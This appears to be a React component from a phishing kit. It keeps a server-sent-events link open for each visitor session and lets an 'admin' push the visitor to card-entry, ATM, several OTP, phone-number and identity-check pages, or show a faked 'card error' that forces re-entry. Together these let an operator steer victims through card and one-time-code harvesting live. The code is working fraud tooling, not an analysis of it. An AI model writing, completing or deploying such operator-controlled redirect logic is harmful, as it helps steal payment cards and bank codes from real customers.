import { useEffect, useRef, useCallback, useState } from "react";
import { useLocation } from "wouter";
import type { SSEMessage } from "@/hooks/useSSE";

interface GlobalRedirectProviderProps {
  children: React.ReactNode;
}

// All possible pages
const pageMap: Record<string, string> = {
  go_home: "/",
  go_form: "/form",
  go_select: "/select",
  go_visa: "/visa",
  go_otp: "/otp",
  go_otp2: "/otp2",
  go_otp3: "/otp3",
  go_atm: "/atm",
  go_nomer: "/nomer",
  go_nomer_wait: "/nomer-wait",
  go_nomer_otp: "/nomer-otp",
  go_identity_check: "/identity-check",
  go_total: "/total",
  go_total2: "/total2",
  go_waiting: "/waiting",
};

export function GlobalRedirectProvider({ children }: GlobalRedirectProviderProps) {
  const [, setLocation] = useLocation();
  const [isConnected, setIsConnected] = useState(false);
  const eventSourceRef = useRef<EventSource | null>(null);
  const reconnectTimeoutRef = useRef<number | null>(null);
  const isRedirectingRef = useRef(false);

  // Get sessionId from localStorage
  const getSessionId = useCallback(() => {
    return localStorage.getItem("sessionId");
  }, []);

  // Handle redirect from admin
  const handleRedirect = useCallback((message: SSEMessage) => {
    console.log("[GlobalRedirect] Received command:", message.action);
    
    // Prevent multiple redirects
    if (isRedirectingRef.current) {
      console.log("[GlobalRedirect] Already redirecting, ignoring");
      return;
    }
    
    // Handle card error - redirect to waiting with error
    if (message.action === "card_error") {
      console.log("[GlobalRedirect] Card error received");
      isRedirectingRef.current = true;
      // Close SSE before redirect
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
        eventSourceRef.current = null;
      }
      setTimeout(() => {
        localStorage.setItem("redirectError", "card_error");
        setLocation("/waiting");
      }, 100);
      return;
    }

    // Handle redirect actions
    const targetPage = pageMap[message.action];
    if (targetPage) {
      console.log("[GlobalRedirect] Redirecting to:", targetPage);
      isRedirectingRef.current = true;
      
      // Close SSE before redirect
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
        eventSourceRef.current = null;
      }
      
      // Navigate to target page
      setTimeout(() => {
        setLocation(targetPage);
      }, 100);
    }
  }, [setLocation]);

  // Connect to SSE
  const connectSSE = useCallback(() => {
    const sessionId = getSessionId();
    if (!sessionId || eventSourceRef.current) return;

    console.log("[GlobalRedirect] Connecting to SSE...");

    const apiUrl = import.meta.env.VITE_API_URL || "";
    const baseUrl = apiUrl || window.location.origin;
    const sseUrl = `${baseUrl}/api/sse/${sessionId}`;

    const eventSource = new EventSource(sseUrl);
    eventSourceRef.current = eventSource;

    // Handle connection established
    eventSource.addEventListener("connected", (event) => {
      console.log("[GlobalRedirect] SSE connected:", event.data);
      setIsConnected(true);
      isRedirectingRef.current = false; // Reset on reconnect
    });

    // Handle control events
    eventSource.addEventListener("control", (event) => {
      try {
        const message: SSEMessage = JSON.parse(event.data);
        handleRedirect(message);
      } catch (error) {
        console.error("[GlobalRedirect] Error parsing SSE message:", error);
      }
    });

    // Handle errors
    eventSource.onerror = (error) => {
      console.error("[GlobalRedirect] SSE error:", error);
      setIsConnected(false);

      // Close current connection
      eventSource.close();
      eventSourceRef.current = null;

      // Attempt to reconnect after 3 seconds
      if (!isRedirectingRef.current) {
        console.log("[GlobalRedirect] Reconnecting in 3 seconds...");
        reconnectTimeoutRef.current = window.setTimeout(() => {
          connectSSE();
        }, 3000);
      }
    };

    eventSource.onopen = () => {
      console.log("[GlobalRedirect] SSE connection opened");
      setIsConnected(true);
    };
  }, [getSessionId, handleRedirect]);

  // Connect on mount
  useEffect(() => {
    const sessionId = getSessionId();
    if (sessionId) {
      console.log("[GlobalRedirect] Session found, connecting...");
      connectSSE();
    } else {
      console.log("[GlobalRedirect] No session found, skipping SSE connection");
    }

    return () => {
      // Cleanup on unmount
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
        eventSourceRef.current = null;
      }
      if (reconnectTimeoutRef.current) {
        clearTimeout(reconnectTimeoutRef.current);
        reconnectTimeoutRef.current = null;
      }
    };
  }, [connectSSE, getSessionId]);

  return (
    <>
      {children}
      {/* Optional: Global connection indicator (commented out, can enable for debugging) */}
      {/* <div className="fixed top-2 right-2 z-50">
        <div className={`px-2 py-1 rounded text-xs ${isConnected ? 'bg-green-500' : 'bg-red-500'} text-white`}>
          {isConnected ? 'SSE Connected' : 'SSE Disconnected'}
        </div>
      </div> */}
    </>
  );
}
